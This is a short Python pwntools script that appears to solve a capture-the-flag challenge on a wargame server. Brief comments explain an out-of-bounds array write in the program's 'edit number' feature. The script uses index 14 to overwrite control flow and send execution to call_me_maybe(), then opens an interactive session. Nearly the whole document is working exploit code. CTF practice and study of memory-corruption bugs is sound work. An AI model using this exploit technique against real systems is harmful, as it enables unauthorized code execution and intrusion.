from pwn import *
import time

#r = remote('localhost', 5566)
r = remote('hackme.inndy.tw', 7701)

# This program is NX enabled, so we don't take 'let the program execute our shellcode' 
# in our consider
# 
# At 'edit number', we can find this:
# mov    DWORD PTR [rbp+rax*4-0x30],edx
#
# Setting rax to be 14 to control the process of this program.
# We wanna let this program execute 'call_me_maybe()'(0x080485fb)
#


print(r.recv(18))
r.send("lalala" + "\n")

print(r.recv(73))
r.send("1\n")

print(r.recv(15))
r.send("14\n")

print(r.recv(10))
r.send(str(int("0x080485fb", 16)) + "\n")

print(r.recv(73))
r.send("0\n")

r.interactive()

